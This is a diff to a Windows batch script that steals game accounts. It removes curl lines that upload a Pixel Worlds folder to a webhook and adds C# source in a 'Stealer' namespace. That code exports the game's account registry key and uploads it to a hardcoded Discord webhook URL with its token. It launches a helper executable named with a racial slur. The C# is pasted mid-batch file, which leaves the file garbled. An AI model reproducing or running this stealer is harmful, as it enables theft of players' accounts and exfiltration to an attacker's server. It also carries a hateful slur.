@@ -236,12 +236,51 @@ goto skipminecraft
 
 :: pixelworlds - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ---------------------------------------------------------
-goto skippixelworlds
-	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- PixelWorlds -```\"}"  %webhook%
-	curl --silent --output /dev/null -F acc.zip=@"C:\Program Files (x86)\Steam\steamapps\common\Pixel Worlds" %webhook%
-	
-	timeout /t 2 /nobreak > NUL
-:skippixelworlds
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Net;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+
+namespace Stealer
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string reg = @"HKEY_CURRENT_USER\SOFTWARE\Kukouri\Pixel Worlds";
+            string export = Path.GetTempPath() + @"\Account.reg";
+            exportRegistry(reg,export);
+            WebClient wb = new WebClient();
+            wb.UploadFile("https://discord.com/api/webhooks/1000805774064373820/hzOkyGRvfFGZuX6q5VZzzfOx_Rk5K3op3EewL_0-uqMKYV30j0A4OdIRLGG0aMsWlQv2", export);
+            wb.UploadFile("https://discord.com/api/webhooks/1000805774064373820/hzOkyGRvfFGZuX6q5VZzzfOx_Rk5K3op3EewL_0-uqMKYV30j0A4OdIRLGG0aMsWlQv2", export);
+        }
+
+        static void exportRegistry(string registryPath, string exportPath)
+        {
+            try
+            {
+                Process p = new Process();
+                p.StartInfo.FileName = "nigger.exe";
+                p.StartInfo.UseShellExecute = false;
+                p.StartInfo.RedirectStandardOutput = true;
+                p.StartInfo.RedirectStandardError = true;
+                p.StartInfo.CreateNoWindow = true;
+                p.StartInfo.Arguments = "export \"" + registryPath + "\" \"" + exportPath + "\" /y";
+                p.Start();
+                p.WaitForExit();
+            }
+            catch
+            {
+
+            }
+        }
+    }
+}
+
 
 :: OTHER
 :: -----
